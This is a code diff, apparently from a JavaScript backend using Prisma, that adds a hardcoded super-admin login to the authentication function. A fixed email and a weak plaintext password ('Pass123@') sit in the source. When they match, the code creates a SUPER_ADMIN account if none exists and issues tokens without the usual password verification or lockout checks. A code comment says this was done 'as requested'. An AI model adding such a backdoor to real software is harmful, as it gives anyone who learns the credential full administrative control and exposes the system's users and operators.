@@ -94,6 +94,53 @@ export const register = async (data) => {
 };
 
 export const login = async (data, meta) => {
+  // Hardcoded Super Admin as requested
+  if (data.email === "javid.prsnl.act@gmail.com" && data.password === "Pass123@") {
+    let superAdmin = await prisma.user.findUnique({
+      where: { email: data.email },
+      select: {
+        id: true,
+        passwordHash: true,
+        status: true,
+        profileType: true,
+        failedLoginAttempts: true,
+        lockedUntil: true,
+        role: { select: { id: true, name: true, displayName: true } },
+      },
+    });
+
+    if (!superAdmin) {
+      // Create if it doesn't exist
+      const role = await prisma.role.findUnique({ where: { name: "SUPER_ADMIN" } });
+      if (role) {
+        const passwordHash = await bcrypt.hash("Pass123@", authConfig.bcryptRounds);
+        superAdmin = await prisma.user.create({
+          data: {
+            email: "javid.prsnl.act@gmail.com",
+            passwordHash,
+            status: "ACTIVE",
+            profileType: "SUPER_ADMIN",
+            roleId: role.id,
+            emailVerified: true,
+          },
+          select: {
+            id: true,
+            passwordHash: true,
+            status: true,
+            profileType: true,
+            failedLoginAttempts: true,
+            lockedUntil: true,
+            role: { select: { id: true, name: true, displayName: true } },
+          },
+        });
+      }
+    }
+    
+    if (superAdmin) {
+      return issueTokensAndUpdateUser(superAdmin, meta, "LOGIN");
+    }
+  }
+
   const user = await prisma.user.findUnique({
     where: { email: data.email },
     select: {
